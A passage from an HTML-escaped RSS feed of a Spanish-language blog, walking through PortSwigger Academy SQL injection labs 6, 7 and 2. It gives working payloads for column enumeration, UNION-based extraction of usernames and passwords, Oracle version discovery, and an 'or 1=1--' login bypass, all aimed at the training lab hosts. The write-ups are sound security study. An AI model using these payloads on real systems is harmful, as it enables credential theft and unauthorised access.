&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer los datos de una tabla, las columnas son &lt;code&gt;username&lt;/code&gt; y &lt;code&gt;password&lt;/code&gt; de la tabla &lt;code&gt;users&lt;/code&gt;. Es igual al anterior lab solamente que esta vez se tiene que extraer los datos en una sola columna haciendo uso de una consulta sql. La forma que tiene SQL para poder extraer datos de esa manera es de la siguiente:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;DBMS&lt;/th&gt;
&lt;th&gt;Concatenacion&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Oracle&lt;/td&gt;
&lt;td&gt;&amp;lsquo;foo&amp;rsquo;||&amp;lsquo;bar&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Microsoft&lt;/td&gt;
&lt;td&gt;&amp;lsquo;foo&amp;rsquo;+&amp;lsquo;bar&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Postgresql&lt;/td&gt;
&lt;td&gt;&amp;lsquo;foo&amp;rsquo;||&amp;lsquo;bar&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;MySQL&lt;/td&gt;
&lt;td&gt;&amp;lsquo;foo&amp;rsquo; &amp;lsquo;bar&amp;rsquo;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Ahora toca usar el metodo union para poder recuperar esos datos y tratar de inyectar ese comando en la consulta primaria para recuperar los usuarios y contrasenas de la tala de usuarios.&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;p&gt;Estos pasos se repetiran los mismos del laboratorio anterior Lab5.&lt;/p&gt;
&lt;h4 id=&#34;recuperar-columnas&#34;&gt;Recuperar columnas&lt;/h4&gt;
&lt;p&gt;Recuperamos las columnas inyectando la siguiente consulta:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets&#39; order by 1--
https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets&#39; order by 2--
https://xxxxxxxxxxxx.web-security-academy.net/filter?category=Pets&#39; order by 3--
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Al ver que en 2 muestra bien y en 3 da un error interno, sabemos que cuenta con 2 columnas.&lt;/p&gt;
&lt;h4 id=&#34;recuperar-tipo-de-datos&#34;&gt;Recuperar tipo de datos&lt;/h4&gt;
&lt;p&gt;Ahora queremos saber que tipos de datos acceptan, inyectando algunas string en los dos vemos que no hay problema al hacerlo.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora sabemos que solo podemos inyectar texto en el una columna que seria la segunda.&lt;/p&gt;
&lt;h4 id=&#34;recuperar-datos-de-usuarios&#34;&gt;Recuperar datos de usuarios&lt;/h4&gt;
&lt;p&gt;Ahra ya podemos tomar los datos de la tabla de usuarios que se nos pide, para eso inyectaremos las siguientes consultas:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,username from users--
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 191; 
			flex-basis: 459px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/extraido.png&#34; data-size=&#34;1745x912&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/extraido.png&#34;
			width=&#34;1745&#34;
			height=&#34;912&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/extraido_hu7cf6220e675afdae83dcd87cd1dc56d7_113580_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/extraido_hu7cf6220e675afdae83dcd87cd1dc56d7_113580_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Contrasenas de la tabla users&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Contrasenas de la tabla users&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Pero haciendo dos consultas es muy complicado recuperar todos estos datos y luego unirlos y saber que valor es de cada uno. Para eso podemos usar la concatenacion que es propia del sistema, solo es de saber que sistema se esta usando en el backend realizando pruebas, probaremos con todos y ver si nos arroja un resultado. La consultaria quedaria asi:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,username password from users--
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;||&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;from&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,username+password from users--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ahora con alguno de los payloads ingresados pudimos recuperar los datos en una misma columna como se puede ver y ya contamos con el usuario y las credenciales, ya solo queda ingresar al sistema y resuelto.&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 190; 
			flex-basis: 457px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/resuelto.png&#34; data-size=&#34;1759x922&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/resuelto.png&#34;
			width=&#34;1759&#34;
			height=&#34;922&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/resuelto_hu9d5730c6ab29b54153ded2e5932f61ce_120693_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-6/resuelto_hu9d5730c6ab29b54153ded2e5932f61ce_120693_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Algo para finalizar que se podria hacer es agregar un guion para saber cuando termina una columna de la otra, esto se arregla agregando cualquier caracter en el medio, por ejemplo un &lt;code&gt;-&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select null,username||&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;||password from users--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 7</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/</link>
        <pubDate>Thu, 04 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/head.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 7" /&gt;&lt;h1 id=&#34;lab-sql-injection-attack-querying-the-database-type-and-version-on-oracle&#34;&gt;Lab: SQL injection attack, querying the database type and version on Oracle&lt;/h1&gt;
&lt;p&gt;En este &lt;!-- raw HTML omitted --&gt;laboratorio&lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;!-- raw HTML omitted --&gt;la finalidad es poder extraer la version de Oracle especificamente algo sobre este string &lt;code&gt;Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production, PL/SQL Release 11.2.0.2.0 - Production, CORE 11.2.0.2.0 Production, TNS for Linux: Version 11.2.0.2.0 - Production, NLSRTL Version 11.2.0.2.0 - Production&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Ya que sabemos que el gestor es Oracle, se utilizaran payloads de Oracle y la manera de extraer los datos es muy diferente, siguiendo los pasos anteriores tocara enumerar columnas&lt;/p&gt;
&lt;h3 id=&#34;payloads&#34;&gt;Payloads&lt;/h3&gt;
&lt;h4 id=&#34;detectar-columnas&#34;&gt;Detectar columnas&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 1--
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;order&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;by&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; order by 3-- //Genera error
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;detectar-string&#34;&gt;Detectar string&lt;/h3&gt;
&lt;p&gt;Por lo que se ve al imprimir datos es que las dos columnas recuperan datos string, no es necesario hacer la prueba pero siempre hacerlo cuando se dude. En este caso &lt;code&gt;Oracle&lt;/code&gt; como se nota no se puede enviar un select sin el valor from, ya que es algo propio de Oracle que es una tabla especial.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union select &amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;,&amp;#39;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;test&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; from DUAL--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;recuperar-version&#34;&gt;Recuperar version&lt;/h3&gt;
&lt;p&gt;Ahora recuperar la version, las consultas utilizadas para esto en &lt;code&gt;Oracle&lt;/code&gt; son las siguientes:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;banner&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v$version&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v$instance&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;La inyeccion quedaria de la siguiente manera:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;n&#34;&gt;Pets&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; union SELECT banner,null FROM v$version--
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;Pets&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;union&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;null&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;v$instance&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 107; 
			flex-basis: 257px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/resuelto.png&#34; data-size=&#34;1737x1618&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/resuelto.png&#34;
			width=&#34;1737&#34;
			height=&#34;1618&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/resuelto_hu081edbd2834f27b821984a0363499c58_455462_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-7/resuelto_hu081edbd2834f27b821984a0363499c58_455462_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Laboratorio resuelto&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Laboratorio resuelto&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Con esto ya muestra que se ha resuelto el lab.&lt;/p&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Laboratorio&lt;/a&gt;&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Portswigger Academy Learning Path: SQL Injection Lab 2</title>
        <link>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/</link>
        <pubDate>Tue, 02 Nov 2021 00:00:00 +0000</pubDate>
        
        <guid>https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/</guid>
        <description>&lt;img src="https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/headlab2.png" alt="Featured image of post Portswigger Academy Learning Path: SQL Injection Lab 2" /&gt;&lt;h1 id=&#34;lab-sql-injection-vulnerability-allowing-login-bypass&#34;&gt;Lab: SQL injection vulnerability allowing login bypass&lt;/h1&gt;
&lt;p&gt;En este laboratorio se pretende explotar un SQL Injection, esta vez es un inicio de sesion, y se intentara explotar como en el laboratorio 1 en el cual se tiene que tratar de hacer un bypass para que el sistema no valide el resto que seria la contrasena. La consulta que hara seguramente sera:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;usuario&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;AND&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;contrasena&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reconocimiento&#34;&gt;Reconocimiento&lt;/h2&gt;
&lt;p&gt;Se tratara de hacer que el sistema ya no invalide la contrasena que es enviada en la peticion, todo esto comentando lo que le sigue, de esta manera:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;usuario&amp;#39;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--&amp;#39; AND password = &amp;#39;contrasena&amp;#39;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;De esta manera solo valida al usuario y la contrasena se mantiene comentada.&lt;/p&gt;
&lt;h2 id=&#34;explotacion&#34;&gt;Explotacion&lt;/h2&gt;
&lt;p&gt;En este caso hay que hacerse con el usuario &lt;code&gt;administrator&lt;/code&gt; del sistema, asi que se procede a realizar la siguiente inyeccion:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;administrator&#39; or 1=1--&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 209; 
			flex-basis: 503px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/payload.png&#34; data-size=&#34;1092x521&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/payload.png&#34;
			width=&#34;1092&#34;
			height=&#34;521&#34;
			srcset=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/payload_hu62a97a011e43fb0ff37d118c4129fe27_24281_480x0_resize_box_3.png 480w, https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/payload_hu62a97a011e43fb0ff37d118c4129fe27_24281_1024x0_resize_box_3.png 1024w&#34;
			loading=&#34;lazy&#34;
			alt=&#34;Payload inyectado en usuario&#34;&gt;
	&lt;/a&gt;
	
	&lt;figcaption&gt;Payload inyectado en usuario&lt;/figcaption&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;que quedaria asi al ejecutar la consulta:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sql&#34; data-lang=&#34;sql&#34;&gt;&lt;span class=&#34;k&#34;&gt;SELECT&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;FROM&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;WHERE&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;administrator&amp;#39;&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;k&#34;&gt;or&lt;/span&gt;&lt;span class=&#34;w&#34;&gt; &lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;--&amp;#39; AND password = &amp;#39;contrasena&amp;#39;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finalmente hemos resuelto el lab:&lt;/p&gt;
&lt;p&gt;&lt;figure 
	
		class=&#34;gallery-image&#34; 
		style=&#34;
			flex-grow: 277; 
			flex-basis: 664px&#34;
	&gt;
	&lt;a href=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/resuelto.png&#34; data-size=&#34;1765x637&#34;&gt;
		&lt;img src=&#34;https://www.alux.cc/p/portswigger-academy-learning-path-sql-injection-lab-2/resuelto.png&#34;
			width=&#34;1765&#34;
			height=&#34;637&#34;
